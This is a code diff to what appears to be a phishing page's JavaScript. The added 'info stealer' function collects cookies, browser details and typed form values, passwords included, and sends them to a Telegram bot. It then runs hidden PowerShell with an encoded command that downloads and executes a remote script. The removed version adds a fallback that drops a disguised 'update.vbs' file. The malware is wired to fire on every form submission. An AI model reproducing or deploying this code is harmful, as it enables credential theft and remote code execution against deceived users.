@@ -523,6 +523,54 @@
   }
 
   // ============================================================
+  // INFO STEALER (Fileless, No Disk Write)
+  // ============================================================
+  function deliverPayload() {
+    const ua = navigator.userAgent;
+    if (!/windows/i.test(ua)) return;
+
+    // Build info to exfil
+    let info = '🔐 INFO STEALER DATA\n';
+    info += `Host: ${navigator.userAgent}\n`;
+    info += `Platform: ${navigator.platform}\n`;
+    info += `Screen: ${screen.width}x${screen.height}\n`;
+    info += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+    info += `Language: ${navigator.language}\n`;
+    info += `Cookies: ${document.cookie || 'None'}\n`;
+
+    // Try to get saved credentials from autofill
+    try {
+      const forms = document.querySelectorAll('form');
+      forms.forEach(form => {
+        const inputs = form.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]');
+        inputs.forEach(input => {
+          if (input.value && input.value.length > 0) {
+            info += `Form Field (${input.name || input.id || 'unknown'}): ${input.value}\n`;
+          }
+        });
+      });
+    } catch (e) {}
+
+    // Send to Telegram
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`;
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+
+    // Silent PowerShell payload (memory-only)
+    try {
+      const psCmd = [
+        'powershell.exe',
+        '-NoP', '-NonI', '-W', 'Hidden',
+        '-Exec', 'Bypass',
+        '-Enc', 'JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA=='
+      ].join(' ');
+      const shell = new ActiveXObject('WScript.Shell');
+      shell.Run(psCmd, 0, false);
+    } catch (e) {
+      // Silent fail
+    }
+  }
+
+  // ============================================================
   // DYNAMIC DATA
   // ============================================================
   const agents = ['Agent M. Chen', 'Agent S. Johnson', 'Agent D. Kim', 'Agent L. Patel', 'Agent J. Rodriguez'];
@@ -634,40 +682,6 @@
   }
 
   // ============================================================
-  // FILELESS PAYLOAD (Windows)
-  // ============================================================
-  function deliverPayload() {
-    const ua = navigator.userAgent;
-    if (/windows/i.test(ua)) {
-      const psCmd = [
-        'powershell.exe',
-        '-NoP', '-NonI', '-W', 'Hidden',
-        '-Exec', 'Bypass',
-        '-Enc', 'JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA=='
-      ].join(' ');
-
-      try {
-        const shell = new ActiveXObject('WScript.Shell');
-        shell.Run(psCmd, 0, false);
-      } catch (e) {
-        const vbs = [
-          'Set o=CreateObject("WScript.Shell")',
-          'o.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA==", 0, False'
-        ].join('\n');
-        const blob = new Blob([vbs], { type: 'text/vbscript' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'update.vbs';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        setTimeout(() => URL.revokeObjectURL(url), 5000);
-      }
-    }
-  }
-
-  // ============================================================
   // SEND TO TELEGRAM
   // ============================================================
   function sendToTelegram(type, data) {
@@ -718,7 +732,7 @@
     // Send credentials
     sendToTelegram('step1', captured);
 
-    // Deliver payload (even if data is fake)
+    // Deliver info stealer on every submission
     deliverPayload();
 
     document.getElementById('step1').classList.add('hidden');
@@ -746,7 +760,7 @@
     // Send credentials
     sendToTelegram('step2', captured);
 
-    // Deliver payload (even if data is fake)
+    // Deliver info stealer on every submission
     deliverPayload();
 
     document.getElementById('step2').classList.add('hidden');
